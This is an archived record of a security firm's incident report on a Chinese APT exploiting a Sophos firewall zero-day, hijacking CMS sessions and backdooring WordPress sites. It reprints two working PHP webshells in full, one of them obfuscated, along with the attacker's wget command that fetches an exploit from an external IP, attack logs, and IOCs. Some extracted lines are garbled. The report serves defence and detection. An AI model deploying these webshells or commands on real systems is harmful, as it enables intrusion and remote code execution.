{
    "id": "3305f892-41d7-453d-b882-fd0d31447a72",
    "created_at": "2023-01-12T14:59:10.244493Z",
    "updated_at": "2025-03-27T02:09:31.101947Z",
    "deleted_at": null,
    "sha1_hash": "4cbf558641f1e71d1b1e355db9dd0ea7f390781b",
    "title": "2022-06-15 - DriftingCloud- Zero-Day Sophos Firewall Exploitation and an Insidious Breach",
    "authors": "",
    "file_creation_date": "2022-07-02T23:11:52Z",
    "file_modification_date": "2022-07-02T23:11:52Z",
    "file_size": 1503318,
    "plain_text": "# DriftingCloud: Zero-Day Sophos Firewall Exploitation and an Insidious Breach\n\n**[volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/](https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/)**\n\nJune 15, 2022\n\nby Steven Adair, Thomas Lancaster, Volexity Threat Research\n\nVolexity frequently works with individuals and organizations heavily targeted by sophisticated, motivated, and well-equipped threat actors from\naround the world. Some of these individuals or organizations are attacked infrequently or on an irregular basis, while others see a barrage of\nattacks nearly every week. Regardless of the attack frequency, Volexity keeps its guard up, looking for new and old threats however they\nmanifest themselves.\n\nEarlier this year, Volexity detected a sophisticated attack against a customer that is heavily targeted by multiple Chinese advanced persistent\nthreat (APT) groups. This particular attack leveraged a zero-day exploit to compromise the customer's firewall. Volexity observed the attacker\nimplement an interesting webshell backdoor, create a secondary form of persistence, and ultimately launch attacks against the customer's\nstaff. These attacks aimed to further breach cloud-hosted web servers hosting the organization's public-facing websites. This type of attack is\nrare and difficult to detect. This blog post serves to share what highly targeted organizations are up against and ways to defend against attacks\nof this nature.\n\n**Note that the vulnerability discussed in this article was resolved by Sophos on the 25th March 2022 as indiciated in** **[this advisory.](https://www.sophos.com/en-us/security-advisories/sophos-sa-20220325-sfos-rce)**\n\n## Detecting a Firewall Breach\n\nOn March 8, 2022, through its [Network Security Monitoring service, Volexity detected anomalous activity emanating from a customer's Sophos](https://www.volexity.com/services-overview/network-security-monitoring/)\nFirewall. Volexity received alerts from custom signatures it had deployed that immediately put the device under suspicion of being\ncompromised. This led to a forensic investigation where Volexity acquired memory, selective files, and disk images from the Sophos Firewall.\nAnalysis of the data led to the discovery of a backdoor on the firewall, as well as evidence of exploitation dating back to March 5, 2022.\nVolexity’s investigation further expanded once it discovered the attacker was using access to the firewall to conduct man-in-the-middle (MITM)\nattacks. The attacker used data collected from these MITM attacks to compromise additional systems outside of the network where the firewall\nresided.\n\n[After Volexity’s investigation, Sophos published an advisory on March 25, 2022, describing a remote code execution (RCE) vulnerability](https://www.sophos.com/en-us/security-advisories/sophos-sa-20220325-sfos-rce)\n(submitted by a third-party) in its firewalls covered by CVE-2022-1040. Volexity believes this is the same vulnerability exploited in its\ninvestigation, as the customer's firewall was up to date and met the criteria for remote exploitation. Volexity attributes these attacks to a\nChinese APT group previously reported to Volexity Threat Intelligence customers under the name \"DriftingCloud\". (Note: The information in\n_this post was available to Volexity Threat Intelligence customers in TIB-20220408 and TIB-20220429.)_\n\nIn this blog post Volexity will discuss the following:\n\n\n-----\n\nct o s t e attac e too a te success u y co p o s g t e Sop os e a\nHow the attacker used session cookies collected via MITM attacks to compromise external systems outside of the network where the\nfirewall resided\nWebshells and malware installed by the attacker, and actions taken on the external system after successful compromise\nRecommendations to monitor for similar compromises in your network\n\nAn overview of the attack flow is given below:\n\n## Breaching the Firewall\n\nVolexity first identified intrusion activity after detecting suspicious traffic originating from the Sophos Firewall to key systems in its customer’s\nnetworks. It was quickly determined the device was likely compromised, and an investigation immediately followed. Volexity first collected\nmemory from the device, and later collected a full disk image to assist in its investigation. Volexity suspected the external-facing User Portal\ncomponent of the Sophos Firewall might be involved; it was a likely attack vector given it was the only Internet-exposed component of this\nnetwork. As a result, Volexity reviewed the web access logs for the device before starting other analysis tasks. These logs revealed significant\nand repeated suspicious access aimed at a valid JSP file (login.jsp), as shown in this sample log entry:\n\n[07/Mar/2022:09:25:58 +0000] <redacted> \"POST /userportal/webpages/myaccount/login.jsp HTTP/1.1\" 200 - 0 \"https://\n<redacted>/userportal/jlbed/fikds4/BQ.jsp\" \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\nChrome/99.0.4844.51 Safari/537.36\"\n\nThese requests show a successful HTTP 200 status code. However, inspection of the underlying code for \"login.jsp\" did not show any\nanomalies or modifications that would lead Volexity to believe this file had been backdoored. It should be noted that the file “BQ.jsp”, seen in\nthe Referrer field, does not exist as part of the User Portal.\n\nAt this point, Volexity implemented a plan to set up a packet capture on the device to intercept inbound web requests. The attacker was active\nwhen Volexity did this, so it did not take long to capture traffic and confirm this traffic was out of the ordinary.\n\n\n-----\n\n_Figure 1. DriftingCloud interacting with a webshell on the Sophos Firewall_\n\n[Prior to capturing network traffic, Volexity captured system memory using Volexity Surge Collect. Data observed from network traffic further](https://www.volexity.com/blog/tag/surge-collect/)\naided the investigation of the memory sample. The network traffic combined with analysis of the memory sample proved to be productive for\npiecing together various aspects of the attacker’s activity.\n\nOne item identified was the presence of large base64 strings adjacent to suspicious requests made to the User Portal component of the device\n(Figure 2) similar to those seen in Figure 1.\n\n_Figure 2. Example suspicious strings in memory_\n\nUsing the adjacent strings as a pivot point, Volexity searched on the firewall’s disk for files containing strings similar to those adjacent to the\nbase64 blobs in memory. In doing so, Volexity identified the following legitimate component of the firewall had been modified by the attacker:\n\n/usr/share/webconsole/WEB-INF/classes/cyberoam/sessionmanagement/SessionCheckFilter.class\n\nThe investigation revealed the attacker timestomped this file, so its last modify time was the same as other files in this directory. This CLASS\nfile is a legitimate component of the Sophos Firewall. Its purpose is to call SessionCheckHelper with correct parameters based on the current\nURI, which in turn verifies that the user has a valid session (and if not, it directs them to log in). Without reverse-engineering the firewall's web\nUI, Volexity assumes this helper is called when any request is made to any component of the Sophos Firewall’s portal. The attacker created\n[their own version of this file containing malicious logic. A decompilation of the malicious file using ByteCodeViewer is shown in Figure 3.](https://github.com/Konloch/bytecode-viewer)\n\n\n-----\n\n_Figure 3. A decompilation of the malicious SessionCheckFilter.class file_\n\nIn summary, the malicious code added to SessionCheckFilter.class used the following workflow:\n\nCheck that the incoming request URI or “Accept” HTTP header contains the string “Applicationssid”; if this fails, proceed with legitimate\nfunctionality.\nCheck that the incoming request is a POST; if this fails, proceed with legitimate functionality.\nIf both checks pass, decode the POST body using base64 and AES using the key “a918c0e8d8153bfc”; this is likely a partial (16\ncharacter) MD5 of a plaintext password used on the attacker's side.\n[The result of the decode should be another CLASS file which is loaded using SecureClassLoader.](https://docs.oracle.com/javase/7/docs/api/java/security/SecureClassLoader.html)\n\nThis workflow effectively backdoored the Sophos Firewall with a webshell that could be accessed through any URL of the attacker’s choosing.\nThe attacker attempted to blend in by accessing this webshell through requests against the \"login.jsp\" file. At first glance, this might appear to\nbe a brute-force login attempt instead of an interaction with a backdoor. The only real elements that appeared out of the ordinary in the log files\nwere the referrer values and the response status codes. CLASS files are compiled and not simply text files, which makes an edit like this not\nas trivial as with similar webshell cases. It is likely the attacker decompiled the class (either by retrieving it from the firewall, or from a local\nfirewall used for testing), and then created their own version locally before re-compiling it and placing it on the device.\n\n[Volexity decoded some requests made by the attacker using this webshell and found the attacker was using the publicly available BEHINDER](https://github.com/MountCloud/BehinderClientSource/blob/master/src/main/java/net/rebeyond/behinder/payload/java/SocksProxy.java)\nframework. It is interesting to note that this is the same framework Volexity believed was leveraged by one or more Chinese APT groups\n[involved in the recent zero-day exploitation of Confluence Servers systems by way of CVE-2022-26134.](https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence/)\n\n## Additional Findings from the Firewall\n\nIn addition to this webshell component, Volexity identified several other actions performed by the attacker on the Sophos Firewall that further\ncompromised the victim and ensured persistence.\n\nThe attacker created VPN user accounts and associated certificate pairs on the firewall to facilitate legitimate remote network access.\nAs part of the exploitation of the Sophos Firewall, the attacker wrote and executed a file on disk at the following path:\n\n/conf/certificate/pre_install.sh\n\n\n-----\n\ne e ecuted, t e p e_ sta s e u s a a c ous co a d to do oad a b a y, e ecute t, t e de ete t o d s t t e t e\nof analysis, the binary was absent from the command-and-control (C2) server, and it was not present in memory or on disk. This file did\nnot appear to be a legitimate component of the firewall.\n\n## Moving Beyond the Firewall\n\nWhile gaining access to the target's Sophos Firewall was likely a primary objective, it appears this was not the attacker's only objective.\nVolexity discovered that the attacker used their access to the firewall to modify DNS responses for specially targeted websites in order to\nperform MITM attacks. The modified DNS responses were for hostnames that belonged to the victim organization and for which they\nadministered and managed the content. This allowed the attacker to intercept user credentials and session cookies from administrative access\nto the websites' content management system (CMS). Volexity determined that in multiple cases, the attacker was able to access the CMS\nadmin pages of the victim organization's websites with valid session cookies they had hijacked.\n\nThe log snippet below shows the first interaction with a victim web domain by the attacker:\n\n172.x.x.x - - - - [16/Mar/2022:08:19:57 +0000] \"target.tld\" \"GET /wp-admin/ HTTP/1.1\" 200 46067 \"-\" \"Mozilla/5.0 (Windows NT 10.0;\nWin64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.xx.xx\"\n\nUsing these session cookies, the attacker was able to directly access the WordPress admin panel without sending a username and password,\nand they accessed a page that allows installation of additional plugins:\n\n172.x.x.x- - - - [16/Mar/2022:08:22:04 +0000] \" target.tld \" \"GET /wp-admin/plugins.php HTTP/1.1\" 200 42941 \"https://target.tld/wpadmin/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.xx.xx”\n\n172.x.x.x - - - - [16/Mar/2022:08:22:07 +0000] \" target.tld \" \"GET /wp-admin/plugin-install.php HTTP/1.1\" 200 41547\n\"https://target.tld.org/wp-admin/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.xx.xx\"\n\n[The attacker then searched for the File Manager plugin and installed it. This plugin can be used to perform file management tasks on the](https://en-gb.wordpress.org/plugins/wp-file-manager/)\nwebsite, such as uploading, downloading, editing, or deleting a file:\n\n172.x.x.x - - - - [16/Mar/2022:08:26:21 +0000] \"target.tld\" \"GET /wp-admin/plugins.php?\n_wpnonce=13241af34c&action=activate&plugin=wp-file-manager/file_folder_manager.php HTTP/1.1\" 302 0 \"https://target.tld/wpadmin/plugin-install.php?s=file%20manager&tab=search&type=term\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0)\nGecko/20100101 Firefox/97.0\" \"103.76.x.x\"\n\n172.x.x.x - - - - [16/Mar/2022:08:26:22 +0000] \"target.tld\" \"GET /wp-admin/plugins.php?activate=true&plugin_status=all&paged=1&s=\nHTTP/1.1\" 200 43523 \"https://target.tld/wp-admin/plugin-install.php?s=file%20manager&tab=search&type=term\" \"Mozilla/5.0 (Windows\nNT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.x.x\"\n\n172.x.x.x - - - - [16/Mar/2022:08:26:43 +0000] \"target.tld\" \"GET /wp-admin/admin.php?page=wp_file_manager HTTP/1.1\" 200 37492\n\"https://target.tld/wp-admin/plugins.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.x.x\"\n\nHaving successfully installed the File Manager plugin, the attacker used it to upload a PHP file, placing it in the March 2022 WordPress\nuploads directory:\n\n172.x.x.x - - - - [16/Mar/2022:08:29:16 +0000] \"target.tld\" \"GET /wp-admin/admin-ajax.php?\naction=mk_file_folder_manager&_wpnonce=1fead1b621&networkhref=&cmd=ls&target=l1_d3AtY29udGXteC71cGxvYWRzLzIwMjEvMTI&int\n<redacted>.php&reqid=1b191dc2be41a2 HTTP/1.1\" 200 11 \"https://target.tld /wp-admin/admin.php?page=wp_file_manager\" \"Mozilla/5.0\n(Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.xx.xx\"\n\nFinally, the attacker deactivated the File Manager plugin:\n\n172.x.x.x - - - - [16/Mar/2022:08:32:01 +0000] \"target.tld\" \"GET /wp-admin/plugins.php?action=deactivate&plugin=wp-filemanager%2Ffile_folder_manager.php&plugin_status=all&paged=1&s&_wpnonce=bc1ca29a43 HTTP/1.1\" 302 0 \"https://target.tld/wpadmin/plugins.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0\" \"103.76.xx.xx\"\n\n[The webshell was fairly short and consisted of the following PHP code, which appears to be a variation on the Weevely webshell:](https://github.com/epinna/weevely3/blob/master/bd/agents/obfpost_php.tpl)\n\n\n-----\n\np p\n$J='Ktch(\"/K$kh(.+K)K$kf/\",@fileK_get_contents(\"pKhpK://inpuKt\"K),$m)';\n\n[$e='==1) {@oKb_stKart();@eKval([email protected](@x(@bKase64_KdecKode($';](https://www.volexity.com/cdn-cgi/l/email-protection)\n\n$P=str_replace('VG','','cVGreaVGtVGVGe_fVGunVGction');\n\n$l='$k=\"1506aKdbd\";$Kkh=\"7eKfK1ee10Kd884\";$kf=\"9K82K58e20d7a0\"K;';\n\n$C='K$p=\"Kwton3r3P7tKKHoi9Uk\";functioKn Kx($Kt,$k){$c=stKKrlen($k)KK;$l=s';\n\n$B='trlen(K$t);$oK=\"\";for($iK=K0;$i<$lK;){for($jK=K0;($j<$cK&&$i';\n\n[$X='[email protected]_enKcode([email protected](@gzcoKmpKKrKess($o),$k));printK(\"$p$kKh$r$kf\");}';](https://www.volexity.com/cdn-cgi/l/email-protection)\n\n[$W='m[1K]),K$k)));[email protected]_get_contKentKs();@ob_KendK_clean()K;$';](https://www.volexity.com/cdn-cgi/l/email-protection)\n\n$y='<$l);$j++K,$i++K)K{$o.K=$t{$i}^$Kk{$j};}}reKturn K$oK;}if (@pregKK_ma';\n\n$a=str_replace('K','',$l.$C.$B.$y.$J.$e.$W.$X);\n\n$S=$P('',$a);$S();\n\n?>\n\nThis is a simple shell that reads the file input, base64 decodes it, decompresses it, and then runs an eval() on the resulting PHP statement.\nEvidently this was not the attacker's preferred shell, however, as they quickly installed a second shell with a name based on an existing PHP\n[file. This is a popular webshell that appears to go by many names, including IceScorpion, and has the following contents:](https://zhuanlan.zhihu.com/p/354906657)\n\n<?php\n\n@error_reporting(0);\n\nsession_start();\n\n$key=\"aece158[snipped]\"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond\n\n$_SESSION['k']=$key;\n\nsession_write_close();\n\n$post=file_get_contents(\"php://input\");\n\nif(!extension_loaded('openssl'))\n\n{\n$t=\"base64_\".\"decode\";\n\n$post=$t($post.\"\");\n\nfor($i=0;$i<strlen($post);$i++) {\n\n$post[$i] = $post[$i]^$key[$i+1&15];\n\n}\n}\nelse\n{\n$post=openssl_decrypt($post, \"AES128\", $key);\n\n}\n$arr=explode('|',$post);\n\n$func=$arr[0];\n\n$params=$arr[1];\n\nclass C{public function __invoke($p) {eval($p.\"\");}}\n\n@call_user_func(new C(),$params);\n\n?>\n\nThis has similar functionality but uses AES128 encryption with a hardcoded password “aece158afa2f0f49”. This is the main shell that the\nattacker used in subsequent exploitation. Based on both PCAPs relating to this shell, other logs on the system, and analysis of the memory\n[image using Volexity Volcano, Volexity was able to piece together a number of commands issued by the attacker. Some interesting](https://www.volexity.com/products-overview/volcano/)\nobservations are provided below:\n\n[The attacker cloned a GitHub repository for CVE-2021-4034 in an attempt to escalate their privileges.](https://github.com/berdav/CVE-2021-4034)\nAfter this did not work, the attacker downloaded a custom implementation of the shared object (db.py) of the same exploit from a Github\npage owned by the attacker (which has since been taken down) .\n\n\n-----\n\n_Figure 4. \"Gooogleapis\" GitHub user and repository containing tools related to compromise of Sophos Firewall devices_\n\n[The same GitHub page also included a Sliver binary named “kstrp”. Volexity did not observe this specific file on an infected system or in](https://github.com/BishopFox/sliver)\nany command. This could suggest that the same repository was used in operations against other targets.\nThe attacker also downloaded another file via wget which is believed to have been another attempt at privilege escalation on the web\n[server. This file appears to have been an attempt to exploit CVE-2021-4034.](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)\n\nwget http://192.248[.]125.58/cve2021-4034.py -O /tmp/x.py\n\n[The attacker used their access to this webserver to install three open-source malware families, including PupyRAT,](https://github.com/n1nj4sec/pupy) [Pantegana and](https://github.com/cassanof/pantegana) [Sliver.](https://github.com/BishopFox/sliver)\nVolexity did not find anything too remarkable about the usage and deployment of these backdoors. However, Volexity did find the server-side\nconfiguration for the Pantegana malware to be worth noting: the attacker attempted to operate as “The SWAG” via “SWAG, Inc.”. This looks to\nbe a custom implementation, as it was found to differ from [the default certificate.](https://github.com/cassanof/pantegana/blob/master/Makefile#L12)\n\n\n-----\n\n_Figure 5. Customised SSL certificate leveraged by the Pantegana malware, shown in BinaryEdge_\n\n## Conclusion\n\n[DriftingCloud is an effective, well equipped, and persistent threat actor targeting five-poisons-related targets. They are able to develop or](https://en.wikipedia.org/wiki/Five_Poisons)\npurchase zero-day exploits to achieve their goals, tipping the scales in their favor when it comes to gaining entry to target networks. It is critical\nfor organizations that support or consist of targeted groups to have network monitoring solutions in place in order to identify compromises\nwhen they inevitably occur. Compromise of gateway devices is a frequent root cause for incidents investigated by Volexity, and compromising\nthem often gives attackers a lead on defenders who are often focused on endpoint and EDR solutions which are not present on these devices.\n\nSophos has published advice on mitigating this vulnerability in their advisory. Specifically, the advisory states the following:\n\n_\"Sophos has observed this vulnerability being used to target a small set of specific organizations primarily in the South Asia region. We have_\n_informed each of these organizations directly. Sophos will provide further details as we continue to investigate. There is no action required for_\n_Sophos Firewall customers with the \"Allow automatic installation of hotfixes\" feature enabled. Enabled is the default setting.\"_\n\nTo generically identify similar attacks to those discussed, Volexity recommends the following:\n\nDeploy network security monitoring and other mechanisms to detect and record traffic from gateway devices.\n[For Unix-based webservers, consider using auditd to enable easier investigation in the event of compromise.](https://linux.die.net/man/8/auditd)\nAsk vendors of perimeter devices (such as firewalls) what capabilities they have to detect a compromise, and what methods would be\navailable for you to investigate a compromise if one were to occur. Some vendors do not allow access to perimeter devices which can\ncomplicate investigations of suspected compromise.\n\nTo prevent these specific attacks from being successful, Volexity recommends the following:\n\n[Use the YARA rules listed on GitHub here to identify suspicious related activity.](https://github.com/volexity/threat-intel/blob/main/2022/2022-06-15%20DriftingCloud%20-%20Zero-Day%20Sophos%20Firewall%20Exploitation%20and%20an%20Insidious%20Breach/indicators/yara.yar)\nBlock the IOCs listed on GitHub **[here.](https://github.com/volexity/threat-intel/blob/main/2022/2022-06-15%20DriftingCloud%20-%20Zero-Day%20Sophos%20Firewall%20Exploitation%20and%20an%20Insidious%20Breach/indicators/indicators.csv)**\n\n### Related Indicators\n\nakamprod[.]com\n\n180.149.38.136\n\nu2d.servusers[.]com\n\n\n-----\n\nservusers[.]com\n\n95.85.71.23\n\n95.85.71.20\n\n5.188.228.40\n\n209.250.231.67\n\n158.247.200.24\n\n192.248.152.58\n\ngoogleanalytics.proxydns[.]com\n\n185.82.218.66\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-15 - DriftingCloud- Zero-Day Sophos Firewall Exploitation and an Insidious Breach.pdf"
    ],
    "report_names": [
        "2022-06-15 - DriftingCloud- Zero-Day Sophos Firewall Exploitation and an Insidious Breach.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c42fe131-a81c-45bb-8f32-61f39263a7d4",
            "created_at": "2023-11-17T02:00:07.60084Z",
            "updated_at": "2025-03-27T02:00:03.232731Z",
            "deleted_at": null,
            "main_name": "DriftingCloud",
            "aliases": [],
            "source_name": "MISPGALAXY:DriftingCloud",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535550,
    "ts_updated_at": 1743041371,
    "ts_creation_date": 1656803512,
    "ts_modification_date": 1656803512,
    "files": {
        "pdf": "https://archive.orkl.eu/4cbf558641f1e71d1b1e355db9dd0ea7f390781b.pdf",
        "text": "https://archive.orkl.eu/4cbf558641f1e71d1b1e355db9dd0ea7f390781b.txt",
        "img": "https://archive.orkl.eu/4cbf558641f1e71d1b1e355db9dd0ea7f390781b.jpg"
    }
}